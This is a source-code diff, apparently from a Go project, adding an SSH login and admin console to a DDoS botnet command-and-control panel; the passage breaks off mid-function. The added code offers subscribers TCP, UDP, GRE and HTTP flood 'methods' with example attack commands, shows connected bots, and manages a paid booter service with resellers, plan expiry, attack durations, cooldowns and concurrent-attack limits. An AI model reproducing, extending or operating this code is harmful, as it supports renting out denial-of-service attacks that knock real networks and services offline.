@@ -402,10 +402,10 @@ func Admin(conn net.Conn) {
 	if strings.TrimSpace(username) != "root" {
 		// Generate and display a captcha
 		captcha := GenerateCaptcha()
-		conn.Write([]byte(fmt.Sprintf("%sCaptcha%s %s%s%s: %s", ansiSeparator, ansiReset, ansiNumbers, captcha, ansiReset, ansiCommands)))
+		captchaPrompt := fmt.Sprintf("%sCaptcha%s %s%s%s: %s", ansiSeparator, ansiReset, ansiNumbers, captcha, ansiReset, ansiCommands)
 
 		// Read the user's captcha input
-		captchaInput, err := Read(conn, "", "", 20)
+		captchaInput, err := Read(conn, captchaPrompt, "", 20)
 		if err != nil || captchaInput != captcha {
 			conn.Write([]byte(ansiError + "Captcha failed!" + ansiReset))
 			time.Sleep(50 * time.Millisecond)
@@ -459,7 +459,6 @@ func Admin(conn net.Conn) {
 			return
 		}
 
-		conn.Write([]byte("\r\n"))
 		cmdName := strings.Split(strings.ToLower(command), " ")[0]
 		if cmdName == "clear" || cmdName == "cls" || cmdName == "c" {
 			blankAfterCommand = false
@@ -1321,4 +1320,945 @@ func FormatBool(b bool) string {
 	}
 
 	return ansiWarning + "false" + ansiReset
+}
+
+// AdminSSH maneja la consola administrativa para conexiones SSH.
+// Sigue el mismo flujo que telnet pero sin los códigos telnet (IAC).
+func AdminSSH(conn net.Conn) {
+	// No enviamos códigos telnet, solo limpiamos pantalla con ANSI
+	conn.Write([]byte("\033[2J\033[1H"))
+	writeLoginHeader(conn)
+	conn.Write([]byte("\r\n" + ansiSystem + "Enter your credentials:" + ansiReset + "\r\n\r\n"))
+
+	// username (en SSH no usar lector telnet)
+	username, err := readSSHLine(conn, fmt.Sprintf("%s%s%s %s->%s %s", ansiPrompt, "Username", ansiReset, ansiSuccess, ansiReset, ansiCommands), "", 20, []string{})
+	if err != nil {
+		return
+	}
+
+	account, err := FindUser(username)
+	if err != nil || account == nil {
+		conn.Write([]byte(ansiError + "Wrong credentials!" + ansiReset))
+		time.Sleep(50 * time.Millisecond)
+		return
+	}
+
+	// password
+	password, err := readSSHLine(conn, fmt.Sprintf("%s%s%s %s->%s %s", ansiPrompt, "Password", ansiReset, ansiSuccess, ansiReset, ansiCommands), "*", 20, []string{})
+	if err != nil {
+		return
+	} else if password != account.Password {
+		conn.Write([]byte(ansiError + "Wrong credentials" + ansiReset))
+		time.Sleep(50 * time.Millisecond)
+		return
+	}
+
+	if strings.TrimSpace(username) != "root" {
+		captcha := GenerateCaptcha()
+		captchaPrompt := fmt.Sprintf("%sCaptcha%s %s%s%s: %s", ansiSeparator, ansiReset, ansiNumbers, captcha, ansiReset, ansiCommands)
+		captchaInput, err := readSSHLine(conn, captchaPrompt, "", 20, []string{})
+		if err != nil || captchaInput != captcha {
+			conn.Write([]byte(ansiError + "Captcha failed!" + ansiReset))
+			time.Sleep(50 * time.Millisecond)
+			return
+		}
+	}
+
+	if account.NewUser {
+		conn.Write([]byte(ansiSystem + "Change to new password" + ansiReset + "\r\n"))
+		newpassword, err := readSSHLine(conn, fmt.Sprintf("%sNew password%s %s->%s %s", ansiSeparator, ansiReset, ansiSeparator, ansiReset, ansiCommands), "*", 20, []string{})
+		if err != nil {
+			return
+		}
+		if err := ModifyField(account, "password", newpassword); err != nil {
+			conn.Write([]byte(ansiError + "Cant change password!" + ansiReset))
+			time.Sleep(50 * time.Millisecond)
+			return
+		}
+		ModifyField(account, "newuser", false)
+	}
+
+	if account.Expiry <= time.Now().Unix() {
+		conn.Write([]byte(ansiWarning + "Your plan has expired! contact your seller to renew!" + ansiReset))
+		time.Sleep(10 * time.Second)
+		return
+	}
+
+	// Crear sesión y continuar
+	session := NewSession(conn, account)
+	defer delete(Sessions, session.Opened.Unix())
+
+	conn.Write([]byte("\033[2J\033[1H"))
+	writeAdminHeader(conn, session.User.Username)
+
+	blankAfterCommand := false
+	for {
+		if blankAfterCommand {
+			conn.Write([]byte("\r\n"))
+		}
+
+		command, err := readSSHLine(
+			conn,
+			adminPrompt(session),
+			"",
+			60,
+			session.History,
+		)
+		if err != nil {
+			return
+		}
+
+		conn.Write([]byte("\r\n"))
+		cmdName := strings.Split(strings.ToLower(command), " ")[0]
+		if cmdName == "clear" || cmdName == "cls" || cmdName == "c" {
+			blankAfterCommand = false
+		} else {
+			blankAfterCommand = true
+		}
+		session.History = append(session.History, command)
+
+		// Main command handling
+
+		switch cmdName {
+
+		case "?", "help", "h":
+			rows := [][]string{
+				{"methods_tcp", ansiCommands + "View all TCP methods available" + ansiReset},
+				{"methods_udp", ansiCommands + "View all UDP methods available" + ansiReset},
+				{"methods_l3", ansiCommands + "View all Layer 3 methods available" + ansiReset},
+				{"methods_l7", ansiCommands + "View all Layer 7 methods available" + ansiReset},
+				{"flags <.method>", ansiCommands + "View attack flags for a specific method" + ansiReset},
+				{"clear", ansiCommands + "Clears your terminal and history" + ansiReset},
+			}
+			writeGradientTable(session.Conn, []string{"Command", "Description"}, rows)
+
+		case "admin?", "adminhelp":
+			if !session.User.Admin {
+				session.Conn.Write([]byte(ansiWarning + "Only admin can use this command." + ansiReset + "\r\n"))
+				continue
+			}
+
+			rows := [][]string{
+				{"attacks", ansiCommands + "Enable or disable attacks possible" + ansiReset},
+				{"reset_user", ansiCommands + "Reset a user's attack logs" + ansiReset},
+				{"bots", ansiCommands + "Show connected bots" + ansiReset},
+				{"api", ansiCommands + "API examples or help" + ansiReset},
+				{"admin", ansiCommands + "Change user privileges" + ansiReset},
+				{"reseller", ansiCommands + "Make a user a reseller" + ansiReset},
+				{"maxtime", ansiCommands + "Change attack maximum time" + ansiReset},
+				{"cooldown", ansiCommands + "Change user cooldown period" + ansiReset},
+				{"max_daily", ansiCommands + "Change maximum daily attacks" + ansiReset},
+				{"conns", ansiCommands + "Change maximum concurrents attacks" + ansiReset},
+				{"days", ansiCommands + "Add days to a user's account" + ansiReset},
+				{"create", ansiCommands + "Create a new user" + ansiReset},
+				{"remove", ansiCommands + "Remove an existing user" + ansiReset},
+				{"broadcast", ansiCommands + "Broadcast a message to all connected clients" + ansiReset},
+				{"users", ansiCommands + "Show all users in the database" + ansiReset},
+				{"ongoing", ansiCommands + "Show ongoing attacks" + ansiReset},
+				{"sessions", ansiCommands + "Show all active sessions" + ansiReset},
+			}
+			writeGradientTable(session.Conn, []string{"Command", "Description"}, rows)
+
+		// Clear command
+		case "clear", "cls", "c":
+			session.History = make([]string, 0)
+			conn.Write([]byte("\033[2J\033[1H"))
+			writeAdminHeader(conn, session.User.Username)
+			continue
+
+		case "methods_tcp":
+			rows := [][]string{
+				{".synflood", ansiCommands + "TCP SYN flood" + ansiReset},
+				{".ackflood", ansiCommands + "TCP ACK flood" + ansiReset},
+				{".sackflood", ansiCommands + "TCP SACK flood" + ansiReset},
+				{".tcpstream", ansiCommands + "TCP stream flood" + ansiReset},
+				{".tcpsocket", ansiCommands + "TCP socket flood (high connections)" + ansiReset},
+				{".tcpwra", ansiCommands + "TCP wra flood (game servers)" + ansiReset},
+				{".ovh", ansiCommands + "TCP OVH bypass flood" + ansiReset},
+				{".stomp", ansiCommands + "TCP stomp flood" + ansiReset},
+				{"", ""},
+				{"Example", ansiCommands + ".synflood 1.1.1.1 60 dport=80" + ansiReset},
+			}
+			writeGradientTable(session.Conn, []string{"TCP Methods", "Description"}, rows)
+
+		case "methods_udp":
+			rows := [][]string{
+				{".udpthread", ansiCommands + "UDP flood with threads" + ansiReset},
+				{".ppsflood", ansiCommands + "UDP flood high PPS" + ansiReset},
+				{".stdhex", ansiCommands + "UDP flood with random hex payload" + ansiReset},
+				{"", ""},
+				{"Example", ansiCommands + ".udpthread 1.1.1.1 60 dport=80" + ansiReset},
+			}
+			writeGradientTable(session.Conn, []string{"UDP Methods", "Description"}, rows)
+
+		case "methods_l3", "methods_layer3":
+			rows := [][]string{
+				{".greip", ansiCommands + "GRE IP flood (Layer 3)" + ansiReset},
+				{"", ""},
+				{"Example", ansiCommands + ".greip 1.1.1.1 60" + ansiReset},
+			}
+			writeGradientTable(session.Conn, []string{"Layer 3 Methods", "Description"}, rows)
+
+		case "methods_layer7", "methods_l7":
+			rows := [][]string{
+				{".http", ansiCommands + "HTTP flood (Layer 7)" + ansiReset},
+			}
+			writeGradientTable(session.Conn, []string{"Layer 7 Methods", "Description"}, rows)
+
+		case "flags":
+			args := strings.Fields(command)[1:]
+			if len(args) == 0 {
+				session.Conn.Write([]byte(ansiSystem + "Usage: flags <method>\r\n" + ansiReset))
+				session.Conn.Write([]byte(ansiSeparator + "Example" + ansiReset + ": flags .http\r\n"))
+				continue
+			}
+
+			methodName := args[0]
+			lookupName := methodName
+			if !strings.HasPrefix(methodName, ".") {
+				lookupName = "." + methodName
+			}
+			method, ok := Methods[lookupName]
+			if !ok {
+				method, ok = Methods[methodName]
+				if !ok {
+					session.Conn.Write([]byte(ansiError + "Unknown method: " + methodName + ansiReset + "\r\n"))
+					continue
+				}
+			}
+
+			var rows [][]string
+			for _, flagID := range method.Flags {
+				var flagName, description string
+				for name, f := range Flags {
+					if f.ID == flagID {
+						flagName = name
+						description = f.Description
+						break
+					}
+				}
+				if flagName == "" {
+					flagName = fmt.Sprintf("id:%d", flagID)
+					description = "Unknown flag"
+				}
+				// Pasamos solo texto plano; writeGradientTable se encarga del color
+				rows = append(rows, []string{flagName, description})
+			}
+
+			if len(rows) == 0 {
+				session.Conn.Write([]byte(ansiWarning + "No flags defined for this method.\r\n" + ansiReset))
+				continue
+			}
+
+			headers := []string{"Flag", "Description"}
+			writeGradientTable(session.Conn, headers, rows)
+
+		case "attacks":
+			args := strings.Split(strings.ToLower(command), " ")[1:]
+			if !session.User.Admin {
+				session.Conn.Write([]byte(ansiWarning + "Only admin can use this command." + ansiReset + "\r\n"))
+				continue
+			}
+			if len(args) == 0 {
+				status := ansiWarning + "disabled" + ansiReset
+				if Attacks {
+					status = ansiSuccess + "enabled" + ansiReset
+				}
+				session.Conn.Write([]byte(ansiSystem + "Attacks are currently " + status + "\r\n" + ansiReset))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": attacks enable|disable|global <n>|reset_user <user>\r\n"))
+				continue
+			}
+
+			switch strings.ToLower(args[0]) {
+
+			case "enable", "enabled", "active", "on", "attacks": // Enable attacks
+				Attacks = true
+				session.Conn.Write([]byte(ansiSuccess + "Attacks are now enabled!" + ansiReset + "\r\n"))
+			case "disable", "disabled", "off", "!attacks": // Disable attacks
+				Attacks = false
+				session.Conn.Write([]byte(ansiWarning + "Attacks are now disabled!" + ansiReset + "\r\n"))
+			case "status":
+				status := ansiWarning + "disabled" + ansiReset
+				if Attacks {
+					status = ansiSuccess + "enabled" + ansiReset
+				}
+				session.Conn.Write([]byte(ansiSystem + "Attacks are currently " + status + "\r\n" + ansiReset))
+
+			case "global":
+				if len(args[1:]) == 0 {
+					session.Conn.Write([]byte(ansiWarning + "Include a new int for max." + ansiReset + "\r\n"))
+					continue
+				}
+
+				new, err := strconv.Atoi(args[1])
+				if err != nil {
+					session.Conn.Write([]byte(ansiWarning + "Include a new int for max." + ansiReset + "\r\n"))
+					continue
+				}
+
+				if new < 0 {
+					session.Conn.Write([]byte(ansiWarning + "Value cannot be negative." + ansiReset + "\r\n"))
+					continue
+				}
+
+				Options.Templates.Attacks.MaximumOngoing = new
+				session.Conn.Write([]byte(ansiSuccess + "Attacks max running global cap changed!" + ansiReset + "\r\n"))
+
+			case "reset_user": // Reset a users attack logs
+				if len(args[1:]) == 0 {
+					session.Conn.Write([]byte(ansiWarning + "Include a username" + ansiReset + "\r\n"))
+					continue
+				}
+
+				if usr, _ := FindUser(args[1]); usr == nil {
+					session.Conn.Write([]byte(ansiWarning + "Include a valid username" + ansiReset + "\r\n"))
+					continue
+				}
+
+				if err := CleanAttacksForUser(args[1]); err != nil {
+					session.Conn.Write([]byte(ansiError + "Failed to clean attack logs!" + ansiReset + "\r\n"))
+					continue
+				}
+
+				session.Conn.Write([]byte(ansiSuccess + "Attack logs reset for that user" + ansiReset + "\r\n"))
+			default:
+				session.Conn.Write([]byte(ansiWarning + "Unknown attacks command." + ansiReset + "\r\n"))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": attacks enable|disable|status|global <n>|reset_user <user>\r\n"))
+			}
+
+			continue
+
+		case "bots":
+			// Non-admins can not see the different types of client sources connected
+			if !session.User.Admin {
+				session.Conn.Write([]byte(fmt.Sprintf("%sTotal%s %s%d%s\r\n", ansiSeparator, ansiReset, ansiNumbers, len(Clients), ansiReset)))
+				continue
+			}
+
+			// Loops through all the access clients
+			for source, amount := range SortClients(make(map[string]int)) {
+				session.Conn.Write([]byte(fmt.Sprintf("%s%s%s: %s%d%s\r\n", ansiPrimary, source, ansiReset, ansiNumbers, amount, ansiReset)))
+			}
+
+			continue
+		case "api": // API examples/help
+			if !session.User.API && !session.User.Admin {
+				session.Conn.Write([]byte(ansiWarning + "You don't have API access!" + ansiReset + "\r\n"))
+				continue
+			} else if session.User.Admin || session.User.Reseller && session.User.API {
+				args := strings.Split(command, " ")[1:]
+
+				if len(args) == 0 {
+					status := ansiWarning + "disabled" + ansiReset
+					if session.User.API {
+						status = ansiSuccess + "enabled" + ansiReset
+					}
+					session.Conn.Write([]byte(ansiSystem + "Your API status: " + status + "\r\n" + ansiReset))
+					session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": api <true/false> <username>\r\n"))
+					continue
+				}
+
+				if len(args) <= 1 {
+					session.Conn.Write([]byte(ansiWarning + "You must provide a username & bool" + ansiReset + "\r\n"))
+					continue
+				}
+
+				status, err := strconv.ParseBool(args[0])
+				if err != nil {
+					session.Conn.Write([]byte(ansiWarning + "You must provide a username & bool" + ansiReset + "\r\n"))
+					continue
+				}
+
+				user, err := FindUser(args[1])
+				if err != nil || user == nil {
+					session.Conn.Write([]byte(ansiError + "User doesnt exist" + ansiReset + "\r\n"))
+					continue
+				}
+
+				if user.API == status {
+					session.Conn.Write([]byte(ansiWarning + "Status is already what you are trying to change too" + ansiReset + "\r\n"))
+					continue
+				}
+
+				if err := ModifyField(user, "api", status); err != nil {
+					session.Conn.Write([]byte(ansiError + "Failed to modify users api status" + ansiReset + "\r\n"))
+					continue
+				}
+
+				session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed users api status to %v!%s\r\n", ansiSuccess, status, ansiReset)))
+				continue
+			}
+
+			session.Conn.Write([]byte(fmt.Sprintf("%sHey %s, it seems you have API access!%s\r\n", ansiSystem, session.User.Username, ansiReset)))
+
+		case "admin":
+			if !session.User.Admin {
+				session.Conn.Write([]byte(ansiWarning + "You don't have the access for that!" + ansiReset + "\r\n"))
+				continue
+			}
+
+			args := strings.Fields(command)[1:] // Usa Fields para mejor manejo
+
+			if len(args) == 0 {
+				// Muestra ayuda y estado del propio usuario
+				status := ansiSuccess + "true" + ansiReset
+				session.Conn.Write([]byte(ansiSystem + "Your admin status: " + status + "\r\n" + ansiReset))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": admin <true/false> <username>\r\n"))
+				continue
+			}
+
+			if len(args) < 2 {
+				session.Conn.Write([]byte(ansiWarning + "You must provide a username and boolean (true/false)" + ansiReset + "\r\n"))
+				continue
+			}
+
+			status, err := strconv.ParseBool(args[0])
+			if err != nil {
+				session.Conn.Write([]byte(ansiWarning + "Invalid boolean value. Use true or false." + ansiReset + "\r\n"))
+				continue
+			}
+
+			username := args[1]
+			user, err := FindUser(username)
+			if err != nil || user == nil {
+				session.Conn.Write([]byte(ansiError + "User does not exist" + ansiReset + "\r\n"))
+				continue
+			}
+
+			if user.Admin == status {
+				session.Conn.Write([]byte(ansiWarning + "Status is already set to that value" + ansiReset + "\r\n"))
+				continue
+			}
+
+			if err := ModifyField(user, "admin", status); err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to modify user's admin status" + ansiReset + "\r\n"))
+				continue
+			}
+
+			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed user's admin status to %v!%s\r\n", ansiSuccess, status, ansiReset)))
+			continue
+		case "reseller":
+			if !session.User.Admin {
+				session.Conn.Write([]byte(ansiWarning + "You don't have the access for that!" + ansiReset + "\r\n"))
+				continue
+			}
+
+			args := strings.Split(command, " ")[1:]
+
+			if len(args) == 0 {
+				status := ansiWarning + "disabled" + ansiReset
+				if session.User.Reseller {
+					status = ansiSuccess + "enabled" + ansiReset
+				}
+				session.Conn.Write([]byte(ansiSystem + "Your reseller status: " + status + "\r\n" + ansiReset))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": reseller <true/false> <username>\r\n"))
+				continue
+			}
+
+			if len(args) <= 1 {
+				session.Conn.Write([]byte(ansiWarning + "You must provide a username & bool" + ansiReset + "\r\n"))
+				continue
+			}
+
+			status, err := strconv.ParseBool(args[0])
+			if err != nil {
+				session.Conn.Write([]byte(ansiWarning + "You must provide a username & bool" + ansiReset + "\r\n"))
+				continue
+			}
+
+			user, err := FindUser(args[1])
+			if err != nil || user == nil {
+				session.Conn.Write([]byte(ansiError + "User doesnt exist" + ansiReset + "\r\n"))
+				continue
+			}
+
+			if user.Reseller == status {
+				session.Conn.Write([]byte(ansiWarning + "Status is already what you are trying to change too" + ansiReset + "\r\n"))
+				continue
+			}
+
+			if err := ModifyField(user, "reseller", status); err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to modify users reseller status" + ansiReset + "\r\n"))
+				continue
+			}
+
+			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed users reseller status to %v!%s\r\n", ansiSuccess, status, ansiReset)))
+			continue
+
+		case "maxtime":
+			if !session.User.Admin {
+				session.Conn.Write([]byte(ansiWarning + "You don't have the access for that!" + ansiReset + "\r\n"))
+				continue
+			}
+
+			args := strings.Split(command, " ")[1:]
+
+			if len(args) == 0 {
+				status := ansiWarning + "disabled" + ansiReset
+				if session.User.Maxtime > 0 {
+					status = fmt.Sprintf("%s%d seconds%s", ansiNumbers, session.User.Maxtime, ansiReset)
+				}
+				session.Conn.Write([]byte(ansiSystem + "Your maxtime status: " + status + "\r\n" + ansiReset))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": maxtime <seconds> <username>\r\n"))
+				continue
+			}
+
+			if len(args) <= 1 {
+				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
+				continue
+			}
+
+			maxtime, err := strconv.Atoi(args[0])
+			if err != nil {
+				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
+				continue
+			}
+
+			user, err := FindUser(args[1])
+			if err != nil || user == nil {
+				session.Conn.Write([]byte(ansiError + "User doesnt exist" + ansiReset + "\r\n"))
+				continue
+			}
+
+			if err := ModifyField(user, "maxtime", maxtime); err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to modify users maxtime status" + ansiReset + "\r\n"))
+				continue
+			}
+
+			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed users maxtime status to %s%d%s!%s\r\n", ansiSuccess, ansiNumbers, maxtime, ansiSuccess, ansiReset)))
+			continue
+
+		case "cooldown":
+			if !session.User.Admin {
+				session.Conn.Write([]byte(ansiWarning + "You don't have the access for that!" + ansiReset + "\r\n"))
+				continue
+			}
+
+			args := strings.Split(command, " ")[1:]
+
+			if len(args) == 0 {
+				status := ansiWarning + "disabled" + ansiReset
+				if session.User.Cooldown > 0 {
+					status = fmt.Sprintf("%s%d seconds%s", ansiNumbers, session.User.Cooldown, ansiReset)
+				}
+				session.Conn.Write([]byte(ansiSystem + "Your cooldown status: " + status + "\r\n" + ansiReset))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": cooldown <seconds> <username>\r\n"))
+				continue
+			}
+
+			if len(args) <= 1 {
+				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
+				continue
+			}
+
+			cooldown, err := strconv.Atoi(args[0])
+			if err != nil {
+				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
+				continue
+			}
+
+			user, err := FindUser(args[1])
+			if err != nil || user == nil {
+				session.Conn.Write([]byte(ansiError + "User doesnt exist" + ansiReset + "\r\n"))
+				continue
+			}
+
+			if err := ModifyField(user, "cooldown", cooldown); err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to modify users maxtime status" + ansiReset + "\r\n"))
+				continue
+			}
+
+			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed users cooldown status to %s%d%s!%s\r\n", ansiSuccess, ansiNumbers, cooldown, ansiSuccess, ansiReset)))
+			continue
+
+		case "conns":
+			if !session.User.Admin {
+				session.Conn.Write([]byte(ansiWarning + "You don't have the access for that!" + ansiReset + "\r\n"))
+				continue
+			}
+
+			args := strings.Split(command, " ")[1:]
+
+			if len(args) == 0 {
+				status := ansiWarning + "disabled" + ansiReset
+				if session.User.Conns > 0 {
+					status = fmt.Sprintf("%s%d%s", ansiNumbers, session.User.Conns, ansiReset)
+				}
+				session.Conn.Write([]byte(ansiSystem + "Your conns status: " + status + "\r\n" + ansiReset))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": conns <number> <username>\r\n"))
+				continue
+			}
+
+			if len(args) <= 1 {
+				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
+				continue
+			}
+
+			conns, err := strconv.Atoi(args[0])
+			if err != nil {
+				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
+				continue
+			}
+
+			user, err := FindUser(args[1])
+			if err != nil || user == nil {
+				session.Conn.Write([]byte(ansiError + "User doesnt exist" + ansiReset + "\r\n"))
+				continue
+			}
+
+			if err := ModifyField(user, "conns", conns); err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to modify users conns status" + ansiReset + "\r\n"))
+				continue
+			}
+
+			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed users conns status to %s%d%s!%s\r\n", ansiSuccess, ansiNumbers, conns, ansiSuccess, ansiReset)))
+			continue
+
+		case "max_daily":
+			if !session.User.Admin {
+				session.Conn.Write([]byte(ansiWarning + "You don't have the access for that!" + ansiReset + "\r\n"))
+				continue
+			}
+
+			args := strings.Split(command, " ")[1:]
+
+			if len(args) == 0 {
+				status := ansiWarning + "disabled" + ansiReset
+				if session.User.MaxDaily > 0 {
+					status = fmt.Sprintf("%s%d%s", ansiNumbers, session.User.MaxDaily, ansiReset)
+				}
+				session.Conn.Write([]byte(ansiSystem + "Your max_daily status: " + status + "\r\n" + ansiReset))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": max_daily <number> <username>\r\n"))
+				continue
+			}
+
+			if len(args) <= 1 {
+				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
+				continue
+			}
+
+			days, err := strconv.Atoi(args[0])
+			if err != nil {
+				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
+				continue
+			}
+
+			user, err := FindUser(args[1])
+			if err != nil || user == nil {
+				session.Conn.Write([]byte(ansiError + "User doesnt exist" + ansiReset + "\r\n"))
+				continue
+			}
+
+			if err := ModifyField(user, "max_daily", days); err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to modify users max_daily status" + ansiReset + "\r\n"))
+				continue
+			}
+
+			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed users max_daily status to %s%d%s!%s\r\n", ansiSuccess, ansiNumbers, days, ansiSuccess, ansiReset)))
+			continue
+
+		case "days":
+
+			if !session.User.Admin {
+				session.Conn.Write([]byte(ansiWarning + "You don't have the access for that!" + ansiReset + "\r\n"))
+				continue
+			}
+
+			args := strings.Split(command, " ")[1:]
+
+			if len(args) == 0 {
+				status := ansiWarning + "disabled" + ansiReset
+				if session.User.Expiry > 0 {
+					expiryTime := time.Unix(session.User.Expiry, 0)
+					status = fmt.Sprintf("%s%s%s", ansiNumbers, expiryTime.Format("2006-01-02 15:04:05"), ansiReset)
+				}
+				session.Conn.Write([]byte(ansiSystem + "Your expiry status: " + status + "\r\n" + ansiReset))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": days <number> <username>\r\n"))
+				continue
+			}
+
+			if len(args) <= 1 {
+				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
+				continue
+			}
+
+			days, err := strconv.Atoi(args[0])
+			if err != nil {
+				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
+				continue
+			}
+
+			user, err := FindUser(args[1])
+			if err != nil || user == nil {
+				session.Conn.Write([]byte(ansiError + "User doesnt exist" + ansiReset + "\r\n"))
+				continue
+			}
+
+			if err := ModifyField(user, "expiry", time.Now().Add(time.Duration(days)*24*time.Hour).Unix()); err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to modify users maxtime status" + ansiReset + "\r\n"))
+				continue
+			}
+
+			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed users expiry status to %s%d%s!%s\r\n", ansiSuccess, ansiNumbers, days, ansiSuccess, ansiReset)))
+			continue
+
+		case "create": // Creates a new user
+			if !session.User.Admin && !session.User.Reseller {
+				session.Conn.Write([]byte(ansiWarning + "Only admins/resellers can currently create users!" + ansiReset + "\r\n"))
+				continue
+			}
+
+			args := make(map[string]string)
+			order := []string{"username", "password", "days"}
+			for pos := 1; pos < len(strings.Split(strings.ToLower(command), " ")); pos++ {
+				if pos-1 >= len(order) {
+					break
+				}
+
+				args[order[pos-1]] = strings.Split(strings.ToLower(command), " ")[pos]
+			}
+
+			// Allows allocation not inside the args
+			for _, item := range order {
+				if _, ok := args[item]; ok {
+					continue
+				}
+				label := strings.ToUpper(item[:1]) + item[1:]
+				value, err := readSSHLine(conn, fmt.Sprintf("%s%s%s %s->%s %s", ansiSeparator, label, ansiReset, ansiSeparator, ansiReset, ansiCommands), "", 40, []string{})
+				if err != nil {
+					return
+				}
+				args[item] = value
+			}
+
+			if usr, _ := FindUser(args["username"]); usr != nil {
+				session.Conn.Write([]byte(ansiWarning + "User already exists in SQL!" + ansiReset + "\r\n"))
+				continue
+			}
+
+			expiry, err := strconv.Atoi(args["days"])
+			if err != nil {
+				session.Conn.Write([]byte(ansiWarning + "Days active must be a int!" + ansiReset + "\r\n"))
+				continue
+			}
+
+			// Inserts the user into the database
+			err = CreateUser(&User{Username: args["username"], Password: args["password"], Maxtime: Options.Templates.Database.Defaults.Maxtime, Admin: Options.Templates.Database.Defaults.Admin, API: Options.Templates.Database.Defaults.API, Cooldown: Options.Templates.Database.Defaults.Cooldown, Conns: Options.Templates.Database.Defaults.Concurrents, MaxDaily: Options.Templates.Database.Defaults.MaxDaily, NewUser: true, Expiry: time.Now().Add(time.Duration(expiry) * time.Hour * 24).Unix()})
+			if err != nil {
+				session.Conn.Write([]byte(ansiError + "Error creating user inside the database!" + ansiReset + "\r\n"))
+				continue
+			}
+
+			session.Conn.Write([]byte(ansiSuccess + "User created successfully" + ansiReset + "\r\n"))
+			continue
+
+		case "remove":
+			if !session.User.Admin {
+				session.Conn.Write([]byte(ansiWarning + "You need admin access for this command" + ansiReset + "\r\n"))
+				continue
+			}
+
+			args := strings.Fields(command)[1:] // Usa Fields para mejor manejo
+
+			//usage si solo se pone "remove" sin argumentos
+			if len(args) == 0 {
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": remove <username>\r\n"))
+				continue
+			}
+
+			if len(args) < 1 {
+				session.Conn.Write([]byte(ansiWarning + "You must provide a username" + ansiReset + "\r\n"))
+				continue
+			}
+
+			username := args[0]
+			usr, err := FindUser(username)
+			if err != nil || usr == nil {
+				session.Conn.Write([]byte(ansiError + "Unknown username" + ansiReset + "\r\n"))
+				continue
+			}
+
+			if err := RemoveUser(username); err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to remove user" + ansiReset + "\r\n"))
+				continue
+			}
+
+			session.Conn.Write([]byte(ansiSuccess + "Removed the user!" + ansiReset + "\r\n"))
+			continue
+
+		case "broadcast":
+			if !session.User.Admin {
+				session.Conn.Write([]byte(ansiWarning + "You need admin access for this command" + ansiReset + "\r\n"))
+				continue
+			}
+
+			args := strings.Fields(command)[1:]
+			if len(args) == 0 {
+				session.Conn.Write([]byte(ansiSystem + "Broadcast a message to all connected clients\r\n" + ansiReset))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": broadcast <message>\r\n"))
+				continue
+			}
+
+			message := strings.Join(args, " ")
+			for _, s := range Sessions {
+				s.Conn.Write([]byte("\x1b[0m\x1b7\x1b[1A\r\x1b[2K " + ansiSeparator + "[BROADCAST]" + ansiReset + " " + ansiSystem + message + ansiReset + "\x1b8"))
+			}
+			session.Conn.Write([]byte(ansiSuccess + "Broadcast sent\r\n" + ansiReset))
+			continue
+
+		case "users":
+			if !session.User.Admin {
+				session.Conn.Write([]byte(ansiWarning + "You need admin access for this command" + ansiReset + "\r\n"))
+				continue
+			}
+
+			users, err := GetUsers()
+			if err != nil {
+				session.Conn.Write([]byte(ansiError + "Err: " + err.Error() + ansiReset + "\r\n"))
+				continue
+			}
+
+			new := simpletable.New()
+			new.Header = &simpletable.Header{
+				Cells: []*simpletable.Cell{
+					{Align: simpletable.AlignCenter, Text: ansiSeparator + "#" + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiSeparator + "User" + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Time" + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Conns" + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Cooldown" + ansiReset},
